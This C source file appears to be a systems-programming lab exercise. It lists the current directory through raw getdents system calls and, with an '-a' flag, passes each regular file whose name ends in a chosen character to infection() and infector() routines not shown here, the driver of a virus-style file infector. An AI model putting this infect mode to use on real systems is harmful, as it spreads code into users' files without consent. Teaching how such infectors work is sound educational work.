#define SYS_OPEN 5
#include <string.h>
#include <dirent.h>
#include "lab4_util.h"
#define SYS_READ     3
#define SYS_WRITE    4
#define SYS_getdents 141 
#define STDIN 0
#define STDOUT 1
#define STDERR 2
#define O_RDONLY 0
#define O_WRONLY 1 
#define BUF_SIZE 8192

extern code_start;
extern code_end;

struct linux_dirent {
    long           d_ino;
    int          d_off;
    unsigned short d_reclen;
    char           d_name[];
};
int main(int argc,char **argv){
    int fileDesc;char buffer[]={'\n'};
    int  len_of_dir;
    char buf[BUF_SIZE];
    struct linux_dirent *d;
    int pos=0;
    char file_type;
    int printLast=0; int infect=0;
    char* charToPrint; 
    int address1 =  code_start;
    int address2 =  code_end;
    
  /*  system_call(SYS_WRITE,STDOUT, "address 1: ",12);
    system_call(SYS_WRITE,STDOUT, itoa(address1),1);
    system_call(SYS_WRITE,STDOUT, buffer,1);
    system_call(SYS_WRITE,STDOUT, "address 2: ",12);
    system_call(SYS_WRITE,STDOUT, itoa(address2),1);
    system_call(SYS_WRITE,STDOUT, buffer,1);
  */
    for(;pos<argc;pos++){
        if(strcmp(argv[pos],"-s")==0){
            printLast=1;
            charToPrint=argv[pos+1];
        }
        if(strcmp(argv[pos],"-a")==0){
            infect=1;
            charToPrint=argv[pos+1];
        }
        
    }
    pos=0;
    
    if(infect==1){
        infection();
    }
    fileDesc= system_call(SYS_OPEN,".", O_RDONLY,00700);//need to check if its -1
    for(;;){
        len_of_dir = system_call(SYS_getdents, fileDesc, buf, BUF_SIZE);
        if(len_of_dir==0) break;
        for(;pos<len_of_dir; pos += d->d_reclen){
            d = (struct linux_dirent *) (buf + pos);
            file_type = *(buf + pos + d->d_reclen - 1);
           
            if(printLast==1){
                if(d->d_name[strlen(d->d_name) - 1]==charToPrint[0]){
                    system_call(SYS_WRITE,STDOUT, d->d_name,strlen(d->d_name));
                    system_call(SYS_WRITE,STDOUT, buffer,1);
                }
            }
            else if(infect==1){
                if(file_type == DT_REG){
                    if(d->d_name[strlen(d->d_name) - 1]==charToPrint[0]){
                        system_call(SYS_WRITE,STDOUT, d->d_name,strlen(d->d_name));
                        system_call(SYS_WRITE,STDOUT, buffer,1);
                        infector(d->d_name);
                    }
                }
            }
            else{
                system_call(SYS_WRITE,STDOUT, d->d_name,strlen(d->d_name));
                system_call(SYS_WRITE,STDOUT, buffer,1);
            }
            
        }
        
    }
   
} 